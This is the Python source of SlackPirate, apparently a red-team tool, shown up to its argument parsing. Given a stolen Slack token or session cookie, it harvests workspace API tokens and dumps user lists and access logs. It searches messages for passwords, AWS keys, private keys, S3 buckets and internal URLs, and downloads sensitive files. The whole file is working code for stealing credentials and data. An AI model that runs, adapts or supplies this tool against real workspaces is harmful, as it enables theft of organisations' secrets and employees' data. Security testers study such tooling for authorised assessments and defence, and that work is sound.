#!/usr/bin/env python3

import argparse
import json
import pathlib
import re
import time
import colorama
import requests
import termcolor
import queue
import urllib.parse

from typing import List
from multiprocessing import Process, Queue
from constants import get_user_agent


#############
# Constants #
#############
POLL_TIMEOUT = 0.5  # Seconds to wait on a retrieval to finish
DOWNLOAD_BATCH_SIZE = 25  # Pull up to this many files at once
# Query params
MAX_RETRIEVAL_COUNT = 900
# Output file names
FILE_USER_LIST = "user-list.json"
FILE_ACCESS_LOGS = "access-logs.json"
FILE_S3 = "S3.txt"
FILE_CREDENTIALS = "passwords.txt"
FILE_AWS_KEYS = "aws-keys.txt"
FILE_PINNED_MESSAGES = "pinned-messages.txt"
FILE_PRIVATE_KEYS = "private-keys.txt"
FILE_LINKS = "URLs.txt"

# Query pieces
S3_QUERIES = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
CREDENTIALS_QUERIES = ["password:", "password is", "pwd", "passwd"]
AWS_KEYS_QUERIES = ["ASIA*", "AKIA*"]
PRIVATE_KEYS_QUERIES = ["BEGIN DSA PRIVATE",
                        "BEGIN EC PRIVATE",
                        "BEGIN OPENSSH PRIVATE",
                        "BEGIN PGP PRIVATE",
                        "BEGIN RSA PRIVATE"]
INTERESTING_FILE_QUERIES = [".config",
                            ".doc",
                            ".docx",
                            ".key",
                            ".p12",
                            ".pem",
                            ".pfx",
                            ".pkcs12",
                            ".ppk",
                            ".sh",
                            ".sql",
                            "backup",
                            "password",
                            "pasted image",
                            "secret"]
LINKS_QUERIES = ["amazonaws",
                 "atlassian",
                 "beta",
                 "confluence",
                 "docs.google.com",
                 "github",
                 "internal",
                 "jenkins",
                 "jira",
                 "kubernetes",
                 "sharepoint",
                 "staging",
                 "swagger",
                 "travis",
                 "trello"]
# Regex constants with explanatory links
# https://regex101.com/r/9GRaem/1
ALREADY_SIGNED_IN_TEAM_REGEX = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"
# https://regex101.com/r/2Hz8AX/2
SLACK_API_TOKEN_REGEX = r"\"api_token\":\"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""
# https://regex101.com/r/cSZW0G/1
WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
# https://regex101.com/r/jWrF8F/2
PRIVATE_KEYS_REGEX = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"
# https://regex101.com/r/6bLaKj/8
S3_REGEX = r"(" \
           r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com" \
           r"|s3://[a-zA-Z0-9-\.\_]+" \
           r"|s3-[a-zA-Z0-9-\.\_\/]+" \
           r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+" \
           r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"
# https://regex101.com/r/DoPV1M/1
CREDENTIALS_REGEX = r"(?i)(" \
                    r"password\s*[`=:\"]+\s*[^\s]+" \
                    r"|password is\s*[`=:\"]+\s*[^\s]+" \
                    r"|pwd\s*[`=:\"]+\s*[^\s]+" \
                    r"|passwd\s*[`=:\"]+\s*[^\s]+)"
# https://regex101.com/r/IEq5nU/4
AWS_KEYS_REGEX = r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
# https://regex101.com/r/SU43wh/1
# Top-level domain capture group
TLD_GROUP = r"(?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int" \
            r"|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae" \
            r"|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd" \
            r"|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc" \
            r"|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd" \
            r"|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm" \
            r"|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt" \
            r"|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is" \
            r"|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb" \
            r"|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm" \
            r"|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng" \
            r"|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr" \
            r"|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si" \
            r"|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf" \
            r"|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us" \
            r"|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)"
LINKS_REGEX = r"(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.]" + TLD_GROUP + \
              r"/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’])" \
              r"|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.]" + TLD_GROUP + r"\b/?(?!@)))"

# Data Classes


class ScanningContext:
    """
    Contains context data for performing scans and storing results.
    """

    def __init__(self, output_directory: str, slack_workspace: str, user_agent: str, user_id: str, username: str):
        self.output_directory = output_directory
        self.slack_workspace = slack_workspace
        self.user_agent = user_agent
        self.user_id = user_id
        self.username = username


# Module functionality
def sleep_if_rate_limited(slack_api_json_response):
    """
    All this function does is check if the response tells us we're being rate-limited. If it is, sleep for
    60 seconds then continue. Previously I was proactively sleeping for 60 seconds before the documented rate-limit
    kicked in but then learned not to trust the docs as they weren't trustworthy (the actual rate-limit is
    more lenient then what they have documented which is a good thing for us but meant that a proactive rate-limit
    would sleep prematurely)
    """

    if slack_api_json_response['ok'] is False and slack_api_json_response['error'] == 'ratelimited':
        print(termcolor.colored("INFO: Slack API rate limit hit - sleeping for 60 seconds", "white", "on_blue"))
        time.sleep(60)
        return True
    else:
        return False


def display_cookie_tokens(cookie, user_agent):
    """
    If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
    then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
    RegEx out the api_token and print it to stdout. Hmm, as I write this comment I wonder if it would be a good idea
    to write the tokens to a file... maybe, maybe not. Probably not ideal to commit a bunch of corporate
    tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
    """

    try:
        if cookie['d'].endswith("="):
            cookie['d'] = urllib.parse.quote(cookie['d'])
        r = requests.get("https://slackpirate-donotuse.slack.com", cookies=cookie)
        already_signed_in_match = re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
        if already_signed_in_match:
            print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
            for workspace in already_signed_in_match:
                r = requests.get(workspace + "/customize/emoji", cookies=cookie)
                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                for slack_token in regex_tokens:
                    collected_scan_context = init_scanning_context(token=slack_token, user_agent=user_agent)
                    if check_if_admin_token(token=slack_token, scan_context=collected_scan_context):
                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (admin token!)', "white", "on_magenta"))
                    else:
                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (not admin)', "white", "on_green"))
        else:
            print(termcolor.colored("No workspaces were found for this cookie", "white", "on_red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    exit()


def init_scanning_context(token, user_agent: str) -> ScanningContext:
    """
    Initialize the Scanning Context which is used for all the scans.
    """

    result = None
    try:
        r = requests.post("https://slack.com/api/auth.test", params=dict(pretty=1),
                          headers={'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}).json()
        if str(r['ok']) == 'True':
            result = ScanningContext(output_directory=str(r['team']) + '_' + time.strftime("%Y%m%d-%H%M%S"),
                                     slack_workspace=str(r['url']), user_agent=user_agent, user_id=str(r['user_id']), username=str(r['user']))
        else:
            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    return result


def check_if_admin_token(token, scan_context: ScanningContext):
    """
    Checks to see if the token provided is an admin, owner, or primary_owner.
    """

    try:
        r = requests.get("https://slack.com/api/users.info", params=dict(
            token=token, pretty=1, user=scan_context.user_id), headers={'User-Agent': scan_context.user_agent}).json()
        return r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))


def print_interesting_information(scan_context: ScanningContext):
    """
    I wonder how many people know that Slack advertise the @domains that can be used to register for the Workspace?
    I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access
    """

    try:
        r = requests.get(scan_context.slack_workspace, headers={'User-Agent': scan_context.user_agent})
        team_domains_match = re.findall(WORKSPACE_VALID_EMAILS_REGEX, str(r.content))
        for domain in team_domains_match:
            print(
                termcolor.colored("INFO: The following domains can be used on this Slack Workspace: " + domain,
                                  "white", "on_blue"))
            print(termcolor.colored("\n"))
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))


def dump_team_access_logs(token, scan_context: ScanningContext):
    """
    You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
    The information here can be useful but I wouldn't fret about it - the other data is far more interesting
    """

    results = []
    print(termcolor.colored("START: Attempting download Workspace access logs", "white", "on_blue"))
    try:
        r = requests.get("https://slack.com/api/team.accessLogs",
                         params=dict(token=token, pretty=1, count=MAX_RETRIEVAL_COUNT),
                         headers={'User-Agent': scan_context.user_agent}).json()
        sleep_if_rate_limited(r)
        if str(r['ok']) == 'True':
            for value in r['logins']:
                results.append(value)
            with open(scan_context.output_directory + '/' + FILE_ACCESS_LOGS, 'a', encoding="utf-8") as outfile:
                json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored(
                "END: Unable to dump access logs (this is normal if you don't have a privileged token on a non-free "
                "Workspace). Slack error: " + str(r['error']), "white", "on_blue"))
            print(termcolor.colored("\n"))
            return
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(termcolor.colored(
        "END: Successfully dumped access logs! Filename: ./" + scan_context.output_directory + "/" + FILE_ACCESS_LOGS,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def dump_user_list(token, scan_context: ScanningContext):
    """
    In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
    `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
    Feel free to ignore the bit about what *they* recommend :-)
    In theory, we can strip out the limit parameter completely and Slack will return the entire dataset *BUT* they say
    this: `If the collection is too large you may experience HTTP 500 errors.` and more importantly:
    `One day pagination will become required to use this method.`
    """

    print(termcolor.colored("START: Attempting to download Workspace user list", "white", "on_blue"))
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    results = []
    try:
        while True:
            r = requests.get("https://slack.com/api/users.list",
                         params=dict(token=token, pretty=1, limit=1, cursor=pagination_cursor),
                         headers={'User-Agent': scan_context.user_agent}).json()
            if not sleep_if_rate_limited(r):
                break
        if str(r['ok']) == 'False':
            print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']),
                                    "white", "on_yellow"))
            print(termcolor.colored("\n"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            while str(r['ok']) == 'True' and pagination_cursor:
                request_url = "https://slack.com/api/users.list"
                params = dict(token=token, pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor)
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    results.append(value)
            with open(scan_context.output_directory + '/' + FILE_USER_LIST, 'a', encoding="utf-8") as outfile:
                json.dump(results, outfile, indent=4, sort_keys=True, ensure_ascii=True)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(
        termcolor.colored("END: Successfully dumped user list! Filename: ./" + scan_context.output_directory +
                          "/" + FILE_USER_LIST,
                          "white", "on_green"))
    print(termcolor.colored("\n"))


def find_s3(token, scan_context: ScanningContext):
    print(termcolor.colored("START: Attempting to find references to S3 buckets", "white", "on_blue"))
    page_count_by_query = dict()

    try:
        r = None
        for query in S3_QUERIES:
            while True:
                r = requests.get("https://slack.com/api/search.messages",
                                 params=dict(token=token, query="\"{}\"".format(query), pretty=1, count=100),
                                 headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            page_count_by_query[query] = (r['messages']['pagination']['page_count'])

        for query, page_count in page_count_by_query.items():
            page = 1
            while page <= page_count:
                sleep_if_rate_limited(r)
                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
                r = requests.get("https://slack.com/api/search.messages",
                                 params=params,
                                 headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(S3_REGEX, str(r))
                with open(scan_context.output_directory + '/' + FILE_S3, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
        print(termcolor.colored("\n"))
    file_cleanup(input_file=FILE_S3, scan_context=scan_context)
    print(
        termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + scan_context.output_directory +
                          "/" + FILE_S3, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_credentials(token, scan_context: ScanningContext):
    print(termcolor.colored("START: Attempting to find references to credentials", "white", "on_blue"))
    pagination = dict()

    try:
        r = None
        for query in CREDENTIALS_QUERIES:
            while True:
                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                                 params=params,
                                 headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                sleep_if_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(CREDENTIALS_REGEX, str(r))
                with open(scan_context.output_directory + '/' + FILE_CREDENTIALS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_CREDENTIALS, scan_context=scan_context)
    print(termcolor.colored(
        "END: If any credentials were found, they will be here: ./" + scan_context.output_directory +
        "/" + FILE_CREDENTIALS,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def find_aws_keys(token, scan_context: ScanningContext):
    print(termcolor.colored("START: Attempting to find references to AWS keys", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in AWS_KEYS_QUERIES:
            while True:
                params = dict(token=token, query=query, pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                sleep_if_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query=key, pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(AWS_KEYS_REGEX, str(r))
                with open(scan_context.output_directory + '/' + FILE_AWS_KEYS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_AWS_KEYS, scan_context=scan_context)
    print(termcolor.colored(
        "END: If any AWS keys were found, they will be here: ./" + scan_context.output_directory +
        "/" + FILE_AWS_KEYS, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_private_keys(token, scan_context: ScanningContext):
    """
    Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
    we're replacing the string with an actual \n new line :-)
    """

    print(termcolor.colored("START: Attempting to find references to private keys", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in PRIVATE_KEYS_QUERIES:
            while True:
                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                sleep_if_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(PRIVATE_KEYS_REGEX, str(r))
                remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                with open(scan_context.output_directory + '/' + FILE_PRIVATE_KEYS, 'a', encoding="utf-8") as log_output:
                    for item in set(remove_new_line_char):
                        log_output.write(item + "\n\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))

    print(termcolor.colored(
        "END: If any private keys were found, they will be here: ./" + scan_context.output_directory +
        "/" + FILE_PRIVATE_KEYS, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_all_channels(token, scan_context: ScanningContext):
    """
    Return a dictionary of the names and ids of all Slack channels that the token has access to.
    This includes public and private channels.
    """

    channel_list = dict()
    pagination_cursor = ''
    try:
        while True:
            r = requests.get("https://slack.com/api/conversations.list",
                             params=dict(token=token,
                                         pretty=1, limit=1, cursor=pagination_cursor,
                                         types='public_channel,private_channel'),
                             headers={'User-Agent': scan_context.user_agent}).json()
            if not sleep_if_rate_limited(r):
                pagination_cursor = r['response_metadata']['next_cursor']
                break
        while str(r['ok']) and pagination_cursor:
            r = requests.get("https://slack.com/api/conversations.list",
                             params=dict(token=token,
                                         pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor,
                                         types='public_channel,private_channel'),
                             headers={'User-Agent': scan_context.user_agent}).json()
            pagination_cursor = r['response_metadata']['next_cursor']
            for channel in r['channels']:
                # Add the channel name as the key and id as the value in the dictionary.
                channel_list[channel['name']] = channel['id']
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    return channel_list


def _write_messages(file_path: str, contents: List[str]):
    """Helper function to write message content to the specified file"""
    if contents:
        print(termcolor.colored("INFO: Writing {} pinned messages".format(len(contents)), "white", "on_blue"))
        with open(file_path, 'a', encoding="utf-8") as out:
            for text_content in contents:
                out.write(text_content)


def find_pinned_messages(token, scan_context: ScanningContext):
    """
    This function looks for pinned messages across all Slack channels the token has access to - including private
    channels. We often find interesting information in pinned messages.
    The function first calls the conversations.list API to grab all Slack channels from the Workspace. It then passes
    the channel_id to pins.list which will either return pinned messages or not. If it does, dump to file :-)
    """

    print(termcolor.colored("START: Attempting to find references to pinned messages", "white", "on_blue"))
    channel_list = find_all_channels(token, scan_context)
    output_file = "{}/{}".format(scan_context.output_directory, FILE_PINNED_MESSAGES)

    total_pinned_messages = 0
    pinned_message_contents = []
    request_header = {'User-Agent': scan_context.user_agent}

    try:
        for channel_name, channel_id in channel_list.items():
            while True:
                params = dict(token=token, pretty=1, channel=channel_id)
                r = requests.get("https://slack.com/api/pins.list", params=params, headers=request_header).json()
                if sleep_if_rate_limited(r):
                    # Write what's been accumulated so far
                    _write_messages(file_path=output_file, contents=pinned_message_contents)
                    # Clear the accumulator
                    pinned_message_contents = []
                    continue

                channel_pinned_messages = [
                    "Channel [{}]: {}\n".format(channel_name, m.get('message', dict()).get('text'))
                    for m in r.get('items', []) if m.get('type') == 'message']
                pinned_message_contents += channel_pinned_messages
                total_pinned_messages += len(channel_pinned_messages)
                break
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))

    if total_pinned_messages > 0:
        _write_messages(file_path=output_file, contents=pinned_message_contents)
        print(termcolor.colored(
            "END: Wrote {} pinned messages to: ./{}".format(total_pinned_messages, output_file),
            "white", "on_green"))
    else:
        print(termcolor.colored("END: No pinned messages were found.", "white", "on_green"))
    print(termcolor.colored("\n"))


def find_interesting_links(token, scan_context: ScanningContext):
    """
    Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
    We're using the special Slack search 'has:link' here.
    """

    print(termcolor.colored("START: Attempting to find references to interesting URLs", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in LINKS_QUERIES:
            while True:
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="has:link {}".format(query), pretty=1, count=100)
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                if not sleep_if_rate_limited(r):
                    break
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                sleep_if_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="has:link {}".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
                regex_results = re.findall(LINKS_REGEX, str(r))
                with open(scan_context.output_directory + '/' + FILE_LINKS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_LINKS, scan_context=scan_context)
    print(termcolor.colored("END: If any URLs were found, they will be here: ./" + scan_context.output_directory +
                            "/" + FILE_LINKS, "white", "on_green"))
    print(termcolor.colored("\n"))


def _retrieve_file_batch(file_requests: List[Process], completed_file_names: Queue):
    for request in file_requests:
        request.start()
    # Wait for all requests to complete
    requests_incomplete = len(file_requests) > 0
    while requests_incomplete:
        try:
            response_message = completed_file_names.get(timeout=POLL_TIMEOUT)
            print(response_message)
        except queue.Empty:
            # This is expected if nothing completed since the last check
            pass
        requests_incomplete = any(request for request in file_requests if request.is_alive())


def _download_file(url: str, output_filename: str, token: str, user_agent: str, download_directory: str, q: Queue):
    """Private helper to retrieve and write a file from a URL"""
    try:
        headers = {'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}
        response = requests.get(url, headers=headers)

        output_file = open("{}/{}".format(download_directory, output_filename), 'wb')
        output_file.write(response.content)
        output_file.close()

        completion_message = "Completed downloading [{}]".format(output_filename)
        q.put(termcolor.colored(completion_message, "white", "on_green"))
    except requests.exceptions.RequestException as ex:
        error_msg = "Problem downloading [{}] from [{}]: {}".format(output_filename, url, ex)
        q.put(termcolor.colored(error_msg, 'white', 'on_red'))


def download_interesting_files(token, scan_context: ScanningContext):
    """
    Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
    """

    print(termcolor.colored("START: Attempting to locate and download interesting files (this may take some time)",
                            "white", "on_blue"))
    download_directory = scan_context.output_directory + '/downloads'
    pathlib.Path(download_directory).mkdir(parents=True, exist_ok=True)

    completed_file_names = Queue()
    file_requests = []
    unique_file_id = set()

    # strips out characters which, though accepted in Slack, aren't accepted in Windows
    bad_chars_re = re.compile('[/:*?"<>|\\\]')  # Windows doesn't like "/ \ : * ? < > " or |
    page_counts_by_query = dict()  # Accumulates the number of pages of results for each query
    common_file_dl_params = (token, scan_context.user_agent, download_directory, completed_file_names)
    try:
        query_header = {'User-Agent': scan_context.user_agent}
        for query in INTERESTING_FILE_QUERIES:
            while True:
                request_url = "https://slack.com/api/search.files"
                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                response_json = requests.get(request_url, params=params, headers=query_header).json()
                if not sleep_if_rate_limited(response_json):
                    break
            page_counts_by_query[query] = response_json['files']['pagination']['page_count']

        for query, page_count in page_counts_by_query.items():
            page = 1
            while page <= page_count:
                request_url = "https://slack.com/api/search.files"
                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
                response_json = requests.get(request_url, params=params, headers=query_header).json()
                if not sleep_if_rate_limited(response_json):
                    new_files = [new_file for new_file in response_json['files']['matches'] if
                                new_file['id'] not in unique_file_id]
                    for new_file in new_files:
                        unique_file_id.add(new_file['id'])
                        file_name = new_file['id'] + "-" + new_file['name']
                        safe_filename = bad_chars_re.sub('_', file_name)  # use underscores to replace tricky characters
                        file_dl_args = (new_file['url_private'], safe_filename) + common_file_dl_params
                        file_requests.append(Process(target=_download_file, args=file_dl_args))
                    page += 1
                else:
                    continue

        # Now actually start the requests
        if file_requests:
            print(termcolor.colored("INFO: Retrieving {} files...".format(len(file_requests)), "white", "on_blue"))
            file_batches = (file_requests[i:i+DOWNLOAD_BATCH_SIZE]
                            for i in range(0, len(file_requests), DOWNLOAD_BATCH_SIZE))
            for batch in file_batches:
                _retrieve_file_batch(batch, completed_file_names)

        while not completed_file_names.empty():  # Print out any final results
            print(termcolor.colored(completed_file_names.get_nowait(), "white", "on_green"))

    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))

    if file_requests:
        print(termcolor.colored(
            "END: Downloaded {} files to: ./{}/downloads".format(len(file_requests), scan_context.output_directory),
            "white", "on_blue"))
    else:
        print(termcolor.colored("END: No interesting files discovered.", "white", "on_blue"))
        print('\n')


def file_cleanup(input_file, scan_context: ScanningContext):
    """
    these few lines of sweetness do two things: (1) de-duplicate the content by using Python Sets and
    (2) remove lines containing "com/archives/" <-- this is found in a lot of the  responses and isn't very useful
    """

    reference_file = pathlib.Path(scan_context.output_directory + '/' + input_file)
    if reference_file.is_file():
        with open(str(reference_file), 'r', encoding="utf-8") as file:
            lines = set(file.readlines())
        with open(str(reference_file), 'w+', encoding="utf-8") as file:
            for line in sorted(lines, key=str.lower):
                if "com/archives/" not in line:
                    file.write(line)
    else:
        return


if __name__ == '__main__':
    # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
    colorama.init()

    parser = argparse.ArgumentParser(argument_default=None, description="This is a tool developed in Python which uses the native Slack APIs "
                                                 "to extract 'interesting' information from Slack Workspaces.")
    parser.add_argument('--cookie', type=str, required=False,
                        help='Slack \'d\' cookie. This flag will instruct the tool'
                             ' to search for Workspaces associated with the cookie.'
                             ' Results along with tokens will be printed to stdout')
    parser.add_argument('--token', type=str, required=False,
                        help='Slack Workspace token. The token should start with XOX.')
    parser.add_argument('--team-access-logs', dest='team_access_logs', action='store_true',
                        help='enable retrieval of team access logs')
    parser.add_argument('--no-team-access-logs', dest='team_access_logs', action='store_false',
                        help='disable retrieval of team access logs')
    parser.add_argument('--user-list', dest='user_list', action='store_true',
                        help='enable retrieval of user list')
    parser.add_argument('--no-user-list', dest='user_list', action='store_false',
                        help='disable retrieval of user list')
    parser.add_argument('--s3-scan', dest='s3_scan', action='store_true',
                        help='enable searching for s3 references in messages')
    parser.add_argument('--no-s3-scan', dest='s3_scan', action='store_false',
                        help='disable searching for s3 references in messages')
    parser.add_argument('--pinned-message-scan', dest='pinned_message_scan', action='store_true',
                        help='enable searching of pinned messages across all channels')
    parser.add_argument('--no-pinned-message-scan', dest='pinned_message_scan', action='store_false',
                        help='disable searching of pinned messages across all channels')
    parser.add_argument('--credential-scan', dest='credential_scan', action='store_true',
                        help='enable searching for messages referencing credentials')
    parser.add_argument('--no-credential-scan', dest='credential_scan', action='store_false',
                        help='disable searching for messages referencing credentials')
    parser.add_argument('--aws-key-scan', dest='aws_key_scan', action='store_true',
                        help='enable searching for AWS keys in messages')
    parser.add_argument('--no-aws-key-scan', dest='aws_key_scan', action='store_false',
                        help='disable searching for AWS keys in messages')
    parser.add_argument('--private-key-scan', dest='private_key_scan', action='store_true',
                        help='enable search for private keys in messages')
    parser.add_argument('--no-private-key-scan', dest='private_key_scan', action='store_false',
                        help='disable search for private keys in messages')
    parser.add_argument('--link-scan', dest='link_scan', action='store_true',
                        help='enable searching for interesting links')
    parser.add_argument('--no-link-scan', dest='link_scan', action='store_false',
                        help='disable searching for interesting links')
    parser.add_argument('--file-download', dest='file_download', action='store_true',
                        help='enable downloading of files from the Workspace')
    parser.add_argument('--no-file-download', dest='file_download', action='store_false',
                        help='disable downloading of files from the Workspace')
    parser.add_argument('--version', action='version',
                        version='SlackPirate.py v0.11. Developed by Mikail Tunç (@emtunc) with contributions from '
                                'the amazing community! https://github.com/emtunc/SlackPirate/graphs/contributors')
    """
    Even with "argument_default=None" in the constructor, all flags were False, so we explicitly set every flag to None
    This is necessary, because we want to differentiate between "all False" and "any False"
    """
    parser.set_defaults(team_access_logs=None, user_list=None, s3_scan=None, credential_scan=None, aws_key_scan=None,
                        private_key_scan=None, link_scan=None, file_download=None, pinned_message_scan=None)
    args = parser.parse_args()

    selected_agent = get_user_agent()
